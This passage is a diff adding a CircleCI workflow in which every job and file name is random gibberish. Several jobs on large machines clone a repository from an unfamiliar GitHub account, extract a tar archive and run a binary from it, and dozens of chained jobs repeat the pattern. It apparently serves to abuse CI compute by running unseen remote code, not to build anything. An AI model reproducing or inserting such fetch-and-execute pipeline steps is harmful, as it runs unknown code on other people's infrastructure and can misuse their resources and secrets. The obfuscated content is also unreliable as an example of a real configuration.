+            ls -la /tmp/dgyreoxmljfudn/dquhoch
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'dquhoch'
+  qdwpkcfjrphzyc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: kmqmwrooyqiag
+          command: |
+            cat /tmp/dgyreoxmljfudn/qqloibx
+      - run:
+          name: frecxckq
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: ewkdnlqkxdnyj
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  rdonruzkdd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: lzkvkwumd
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'etfttyxrbqen theiuqjyotm' > /tmp/dgyreoxmljfudn/lrylrbwehpskhb
+            ls -la /tmp/dgyreoxmljfudn/lrylrbwehpskhb
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'lrylrbwehpskhb'
+  ctusxtqta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: gyrqbkcgzbo
+          command: |
+            cat /tmp/dgyreoxmljfudn/qarggl
+      - run:
+          name: oprymunx
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: isggsweaurzqj
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+  kzgkguiraohtcx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: dhxtwgqwz
+          command: |
+            mkdir -p /tmp/dgyreoxmljfudn
+            echo 'uslwocupejvpxk uwhkiyspsq' > /tmp/dgyreoxmljfudn/qyrvsyskzdavj
+            ls -la /tmp/dgyreoxmljfudn/qyrvsyskzdavj
+      - persist_to_workspace:
+          root: /tmp/dgyreoxmljfudn
+          paths:
+            - 'qyrvsyskzdavj'
+  wxuwk:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dgyreoxmljfudn
+      - run:
+          name: beazzbkbla
+          command: |
+            cat /tmp/dgyreoxmljfudn/adlldffkexnte
+      - run:
+          name: obooaglonwnaknp
+          command: git clone --depth 5 --filter=blob:none https://github.com/ailinabickfordmpyx1-rgb/9e652022e4f6 .
+      - run:
+          name: rygqigicroxq
+          command: tar --extract --file=nacixszolofmx.tar
+      - run:
+          command: $PWD/veoveoycouvziq
+
+workflows:
+  zpsww:
+    jobs:
+      - ypnmifnspglgpa
+      - yrdtpvigps:
+          requires:
+            - ypnmifnspglgpa
+      - kueukhyt:
+          requires:
+            - ypnmifnspglgpa
+      - qdwpkcfjrphzyc:
+          requires:
+            - kueukhyt
+      - jalyohxz:
+          requires:
+            - kueukhyt
+      - ylofyuhjcegei:
+          requires:
+            - jalyohxz
+      - otqalt:
+          requires:
+            - jalyohxz
+      - spjevxxhqjjih:
+          requires:
+            - otqalt
+      - luqdxzvgdyyu:
+          requires:
+            - otqalt
+      - qolodm:
+          requires:
+            - luqdxzvgdyyu
+      - osewzp:
+          requires:
+            - luqdxzvgdyyu
+      - kxvrlasu:
+          requires:
+            - osewzp
+      - gamomnblmafhz:
+          requires:
+            - osewzp
+      - ceqmqrcwyq:
+          requires:
+            - gamomnblmafhz
+      - bhgyfaeh:
+          requires:
+            - gamomnblmafhz
+      - tjxbqoxp:
+          requires:
+            - bhgyfaeh
+      - uzkdr:
+          requires:
+            - bhgyfaeh
+      - qxtqccujccsoi:
+          requires:
+            - uzkdr
+      - cadwwjjao:
+          requires:
+            - uzkdr
+      - jhjfbrfig:
+          requires:
+            - cadwwjjao
+      - iwwuelezhdpaii:
+          requires:
+            - cadwwjjao
+      - cirenamqzxics:
+          requires:
+            - iwwuelezhdpaii
+      - infvnbvsluwt:
+          requires:
+            - iwwuelezhdpaii
+      - czzszfqybfdsjpv:
+          requires:
+            - infvnbvsluwt
+      - pzchejmxvwkopd:
+          requires:
+            - infvnbvsluwt
+      - hrmqz:
+          requires:
+            - pzchejmxvwkopd
+      - rjsewjclyh:
+          requires:
+            - pzchejmxvwkopd
+      - mdzgxuidghwntcd:
+          requires:
+            - rjsewjclyh
+      - iyrxvctvl:
+          requires:
+            - rjsewjclyh
+      - eicayhzxrx:
+          requires:
+            - iyrxvctvl
+      - uiqjonu
+      - zpfpgfukgusa:
+          requires:
+            - uiqjonu
+      - obdbuvmwj:
+          requires:
+            - uiqjonu
+      - bqsuqqnsrevz:
+          requires:
+            - obdbuvmwj
+      - wxwauczcp:
+          requires:
+            - obdbuvmwj
+      - inrcgswnaao:
+          requires:
+            - wxwauczcp
+      - yclyu:
+          requires:
+            - wxwauczcp
+      - sassjfjulmcj:
+          requires:
+            - yclyu
+      - kzgkguiraohtcx:
+          requires:
+            - yclyu
+      - wxuwk:
+          requires:
+            - kzgkguiraohtcx
+      - hbetwnfufxpqbck:
+          requires:
+            - kzgkguiraohtcx
+      - ojfrizuha:
+          requires:
+            - hbetwnfufxpqbck
+      - igkxr:
+          requires:
+            - hbetwnfufxpqbck
+      - ckksvkwnyownl:
+          requires:
+            - igkxr
+      - yrbtssrzb:
+          requires:
+            - igkxr
+      - ggayaalupt:
+          requires:
+            - yrbtssrzb
+      - lqfmlitj:
+          requires:
+            - yrbtssrzb
+      - wsdabyilqt:
+          requires:
+            - lqfmlitj
+      - sxxfbnmodk:
+          requires:
+            - lqfmlitj
+      - nemrotmpfj:
+          requires:
+            - sxxfbnmodk
+      - lfklctxzuoaht:
+          requires:
+            - sxxfbnmodk
+      - zpsww:
+          requires:
+            - lfklctxzuoaht
+      - fpubdu:
+          requires:
+            - lfklctxzuoaht
+      - fmsppgoxcybelw:
+          requires:
+            - fpubdu
+      - rdonruzkdd:
+          requires:
+            - fpubdu
+      - ctusxtqta:
+          requires:
+            - rdonruzkdd
+      - ctjasg:
+          requires:
+            - rdonruzkdd
+      - svuor:
+          requires:
+            - ctjasg
+      - zlcmpctup:
+          requires:
+            - ctjasg
+      - dlizdnpzqlqaz:
+          requires:
+            - zlcmpctup
